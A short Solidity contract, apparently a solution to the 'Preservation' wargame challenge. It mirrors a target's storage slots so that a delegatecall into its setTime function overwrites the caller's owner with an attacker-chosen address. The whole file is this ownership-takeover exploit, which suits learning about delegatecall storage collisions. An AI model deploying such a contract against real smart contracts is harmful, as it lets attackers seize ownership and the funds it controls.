// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract PreservationHack {
    address public SLOT1;
    address public SLOT2;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
